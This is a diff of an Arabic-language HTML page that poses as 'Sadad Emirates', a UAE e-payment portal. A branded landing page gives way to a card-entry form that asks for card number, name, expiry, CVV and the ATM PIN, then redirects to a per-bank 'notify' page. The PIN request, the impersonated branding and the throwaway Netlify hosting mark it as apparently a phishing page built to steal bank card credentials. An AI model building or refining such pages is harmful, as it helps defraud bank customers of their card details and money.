@@ -1,176 +1,337 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-    <title>بوابة سداد الإمارات - الدفع الإلكتروني الآمن</title>
-
-    <!-- شعار المتصفح (Favicon) -->
-    <link rel="icon" type="image/png" href="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
-    <link rel="apple-touch-icon" href="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
-
-    <!-- وسوم المعاينة الشاملة لضمان الظهور على واتساب وتلجرام -->
-    <meta name="description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة - ادفع فواتيرك ورسومك بكل يسر وأمان.">
-    
-    <!-- Open Graph (Facebook / WhatsApp / Telegram) -->
-    <meta property="og:site_name" content="سداد الإمارات" />
-    <meta property="og:title" content="بوابة سداد الإمارات" />
-    <meta property="og:description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة - ادفع فواتيرك ورسومك بكل يسر وأمان." />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://melodious-paprenjak-72bce3.netlify.app/" />
-    <meta property="og:image" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" />
-    <meta property="og:image:secure_url" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" />
-    <meta property="og:image:type" content="image/png" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
-
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="بوابة سداد الإمارات" />
-    <meta name="twitter:description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة" />
-    <meta name="twitter:image" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" />
-
-    <!-- Schema.org -->
-    <meta itemprop="name" content="بوابة سداد الإمارات">
-    <meta itemprop="description" content="منصة الدفع الإلكتروني الآمن في دولة الإمارات العربية المتحدة">
-    <meta itemprop="image" content="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة سداد - تفاصيل الدفع</title>
     <style>
-        :root {
-            --primary-green: #1a6b1a;
-            --text-dark: #2c2c2c;
-            --text-medium: #555555;
-            --background-light: #fafafa;
-            --white: #ffffff;
+        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header img { height: 60px; }
+        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
+        .payment-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
+        h2 { text-align: center; color: green; font-size: 22px; margin-bottom: 10px; }
+        p { text-align: center; color: #666; font-size: 14px; margin-bottom: 25px; }
+        
+        .form-group { margin-bottom: 18px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
+        
+        .input-wrapper { position: relative; }
+        input { 
+            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; 
+            font-size: 16px; box-sizing: border-box; outline: none;
+            transition: border-color 0.3s;
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        input[type="text"]:not(#cardNumber):not(#expiryDate) { direction: rtl; text-align: right; }
+        input[type="text"]#cardNumber, input[type="text"]#expiryDate { direction: ltr; text-align: left; }
+        input[type="password"] { direction: ltr; text-align: left; }
+        input:focus { border-color: green; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
+        input.error { border-color: #d32f2f; background-color: #ffebee; }
+        input.success { border-color: #2e7d32; background-color: #f1f8e9; }
+        
+        .error-message { 
+            display: none; color: #d32f2f; font-size: 12px; margin-top: 5px; 
+            font-weight: bold;
         }
-
-        body {
-            font-family: 'Segoe UI', 'Arial', sans-serif;
-            background-color: var(--background-light);
-            color: var(--text-dark);
-            line-height: 1.7;
-            min-height: 100vh;
+        .error-message.show { display: block; }
+        
+        .success-icon { 
+            position: absolute; left: 12px; top: 38px; color: #2e7d32; 
+            font-size: 18px; display: none;
         }
-
-        .header {
-            background: var(--white);
-            padding: 32px 24px 28px;
-            text-align: center;
-            border-bottom: 1px solid rgba(0,0,0,0.05);
+        .success-icon.show { display: block; }
+        
+        .row { display: flex; gap: 15px; }
+        .row .form-group { flex: 1; }
+        
+        .pay-btn { 
+            width: 100%; background: green; color: white; border: none; padding: 14px; 
+            border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; 
+            transition: 0.3s; margin-top: 10px;
         }
-
-        .logo-image {
-            max-width: 180px;
-            display: block;
-            margin: 0 auto 20px;
-        }
-
-        .main-content {
-            background: var(--white);
-            padding: 40px 24px;
-        }
-
-        .phone-image {
-            width: 300px;
-            display: block;
-            margin: 0 auto 40px;
-        }
-
-        .about-section {
-            max-width: 480px;
-            margin: 0 auto;
-            text-align: center;
-        }
-
-        .cta-button {
-            display: block;
-            width: 100%;
-            padding: 16px 32px;
-            background: var(--primary-green);
-            color: var(--white);
-            text-decoration: none;
-            border-radius: 28px;
-            font-size: 1.063rem;
-            font-weight: 600;
-            text-align: center;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .spinner {
-            width: 22px;
-            height: 22px;
-            border: 3px solid rgba(255,255,255,.4);
-            border-top: 3px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: none;
-        }
-
-        @keyframes spin {
-            to { transform: translate(-50%, -50%) rotate(360deg); }
-        }
-
-        .btn-text {
-            display: inline-block;
-        }
+        .pay-btn:hover:not(:disabled) { background: darkgreen; transform: translateY(-2px); }
+        .pay-btn:disabled { background: #ccc; cursor: not-allowed; }
     </style>
 </head>
-
 <body>
+    <div class="header">
+        <img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد">
+    </div>
+    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك / تفاصيل الدفع</div>
+    
+    <div class="payment-container">
+        <h2>إدخال تفاصيل البطاقة</h2>
+        
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardNumber">رقم البطاقة</label>
+                <div class="input-wrapper">
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    <span class="success-icon">✓</span>
+                </div>
+                <div class="error-message" id="cardError"></div>
+            </div>
 
-<header class="header">
-    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/ogJYCNVKSSWHpRAt.png" class="logo-image">
-    <h1>بوابة سداد الإمارات</h1>
-    <p>الدفع الإلكتروني الآمن</p>
-</header>
+            <div class="form-group">
+                <label for="cardholderName">الاسم كما هو مسجل على البطاقة</label>
+                <div class="input-wrapper">
+                    <input type="text" id="cardholderName" required>
+                    <span class="success-icon">✓</span>
+                </div>
+                <div class="error-message" id="nameError"></div>
+            </div>
+            
+            <div class="row">
+                <div class="form-group">
+                    <label for="expiryDate">تاريخ الانتهاء</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                        <span class="success-icon">✓</span>
+                    </div>
+                    <div class="error-message" id="expiryError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">رمز التحقق (CVV)</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+                        <span class="success-icon">✓</span>
+                    </div>
+                    <div class="error-message" id="cvvError"></div>
+                </div>
+            </div>
 
-<main class="main-content">
-    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663044306601/dWhlEBvDLdGMiZXk.png" class="phone-image">
+            <div class="form-group">
+                <label for="atmPin">رقم الصراف الآلي (PIN)</label>
+                <div class="input-wrapper">
+                    <input type="password" id="atmPin" placeholder="****" maxlength="4" required>
+                    <span class="success-icon">✓</span>
+                </div>
+                <div class="error-message" id="pinError"></div>
+            </div>
 
-    <section class="about-section">
-        <h2>عن سداد الإمارات</h2>
-        <p>
-            سداد الإمارات هي منصة دفع إلكتروني آمنة وسهلة الاستخدام تتيح للمواطنين والمقيمين
-            في دولة الإمارات العربية المتحدة دفع فواتيرهم ورسومهم الحكومية والخاصة بكل يسر وأمان.
-        </p>
+            <button type="submit" class="pay-btn" id="submitBtn" disabled>تأكيد الدفع</button>
+        </form>
+    </div>
 
-        <a href="data.html" class="cta-button" id="startBtn">
-            <span class="btn-text" id="btnText">بدء الخدمة</span>
-            <span class="spinner" id="spinner"></span>
-        </a>
-    </section>
-</main>
+    <script>
+        // ===== VALIDATION FUNCTIONS =====
+        
+        // Luhn Algorithm for card validation
+        function luhnCheck(num) {
+            let sum = 0;
+            let isEven = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let digit = parseInt(num[i], 10);
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return sum % 10 === 0;
+        }
 
-<script>
-  const startBtn = document.getElementById('startBtn');
-  const spinner = document.getElementById('spinner');
-  const btnText = document.getElementById('btnText');
+        // Validate Card Number
+        function validateCardNumber(value) {
+            const cardNum = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (cardNum.length !== 16) {
+                return { valid: false, message: 'رقم البطاقة يجب أن يكون 16 رقماً' };
+            }
+            if (!luhnCheck(cardNum)) {
+                return { valid: false, message: 'رقم البطاقة غير صحيح' };
+            }
+            return { valid: true, message: '' };
+        }
 
-  startBtn.addEventListener('click', function(e) {
-    e.preventDefault();
+        // Validate Cardholder Name
+        function validateCardholderName(value) {
+            if (!value || value.trim().length === 0) {
+                return { valid: false, message: 'الاسم مطلوب' };
+            }
+            if (value.trim().length < 3) {
+                return { valid: false, message: 'الاسم يجب أن يكون 3 أحرف على الأقل' };
+            }
+            if (!/^[\u0600-\u06FF\s\-a-zA-Z]+$/.test(value)) {
+                return { valid: false, message: 'الاسم يجب أن يحتوي على أحرف فقط' };
+            }
+            return { valid: true, message: '' };
+        }
 
-    btnText.style.visibility = 'hidden';
-    spinner.style.display = 'block';
-    startBtn.style.pointerEvents = 'none';
+        // Validate Expiry Date
+        function validateExpiryDate(value) {
+            const parts = value.split('/');
+            if (parts.length !== 2) {
+                return { valid: false, message: 'الصيغة: MM/YY' };
+            }
+            const month = parseInt(parts[0], 10);
+            const year = parseInt(parts[1], 10);
+            
+            if (isNaN(month) || isNaN(year)) {
+                return { valid: false, message: 'أدخل أرقاماً صحيحة' };
+            }
+            if (month < 1 || month > 12) {
+                return { valid: false, message: 'الشهر يجب أن يكون من 01 إلى 12' };
+            }
+            
+            const currentDate = new Date();
+            const currentYear = currentDate.getFullYear() % 100;
+            const currentMonth = currentDate.getMonth() + 1;
+            
+            if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                return { valid: false, message: 'البطاقة منتهية الصلاحية' };
+            }
+            
+            return { valid: true, message: '' };
+        }
 
-    setTimeout(() => {
-      window.location.href = "data.html";
-    }, 3000);
-  });
-</script>
+        // Validate CVV
+        function validateCVV(value) {
+            if (!/^\d{3}$/.test(value)) {
+                return { valid: false, message: 'رمز التحقق يجب أن يكون 3 أرقام' };
+            }
+            return { valid: true, message: '' };
+        }
 
+        // Validate PIN
+        function validatePIN(value) {
+            if (!/^\d{4}$/.test(value)) {
+                return { valid: false, message: 'رقم الصراف يجب أن يكون 4 أرقام' };
+            }
+            return { valid: true, message: '' };
+        }
+
+        // ===== INPUT FORMATTING =====
+        
+        // Format Card Number
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = "";
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += " ";
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+            validateField('cardNumber');
+        });
+
+        // Validate Cardholder Name
+        document.getElementById('cardholderName').addEventListener('input', function (e) {
+            validateField('cardholderName');
+        });
+
+        // Format Expiry Date
+        document.getElementById('expiryDate').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\//g, '').replace(/[^0-9]/gi, '');
+            if (value.length > 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+            validateField('expiryDate');
+        });
+
+        // Validate CVV
+        document.getElementById('cvv').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^0-9]/gi, '').substring(0, 3);
+            validateField('cvv');
+        });
+
+        // Validate PIN
+        document.getElementById('atmPin').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^0-9]/gi, '').substring(0, 4);
+            validateField('atmPin');
+        });
+
+        // ===== FIELD VALIDATION =====
+        
+        function validateField(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorMsg = document.getElementById(fieldId + 'Error');
+            const successIcon = field.parentElement.querySelector('.success-icon');
+            let result;
+
+            switch (fieldId) {
+                case 'cardNumber':
+                    result = validateCardNumber(field.value);
+                    break;
+                case 'cardholderName':
+                    result = validateCardholderName(field.value);
+                    break;
+                case 'expiryDate':
+                    result = validateExpiryDate(field.value);
+                    break;
+                case 'cvv':
+                    result = validateCVV(field.value);
+                    break;
+                case 'atmPin':
+                    result = validatePIN(field.value);
+                    break;
+            }
+
+            if (result.valid) {
+                field.classList.remove('error');
+                field.classList.add('success');
+                errorMsg.classList.remove('show');
+                successIcon.classList.add('show');
+            } else {
+                field.classList.remove('success');
+                field.classList.add('error');
+                errorMsg.textContent = result.message;
+                errorMsg.classList.add('show');
+                successIcon.classList.remove('show');
+            }
+
+            checkFormValidity();
+        }
+
+        // ===== FORM VALIDITY CHECK =====
+        
+        function checkFormValidity() {
+            const cardNum = document.getElementById('cardNumber');
+            const cardName = document.getElementById('cardholderName');
+            const expiry = document.getElementById('expiryDate');
+            const cvv = document.getElementById('cvv');
+            const pin = document.getElementById('atmPin');
+            const submitBtn = document.getElementById('submitBtn');
+
+            const isCardValid = validateCardNumber(cardNum.value).valid;
+            const isNameValid = validateCardholderName(cardName.value).valid;
+            const isExpiryValid = validateExpiryDate(expiry.value).valid;
+            const isCVVValid = validateCVV(cvv.value).valid;
+            const isPINValid = validatePIN(pin.value).valid;
+
+            submitBtn.disabled = !(isCardValid && isNameValid && isExpiryValid && isCVVValid && isPINValid);
+        }
+
+        // ===== FORM SUBMISSION =====
+        
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Final validation
+            const cardNum = document.getElementById('cardNumber');
+            const cardName = document.getElementById('cardholderName');
+            const expiry = document.getElementById('expiryDate');
+            const cvv = document.getElementById('cvv');
+            const pin = document.getElementById('atmPin');
+
+            if (!validateCardNumber(cardNum.value).valid ||
+                !validateCardholderName(cardName.value).valid ||
+                !validateExpiryDate(expiry.value).valid ||
+                !validateCVV(cvv.value).valid ||
+                !validatePIN(pin.value).valid) {
+                alert('يرجى التحقق من جميع البيانات المدخلة');
+                return;
+            }
+
+            // Get bank from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const bank = urlParams.get('bank') || 'qnb';
+            
+            // Redirect to success notification
+            window.location.href = `notify_${bank}.html`;
+        });
+    </script>
 </body>
 </html>
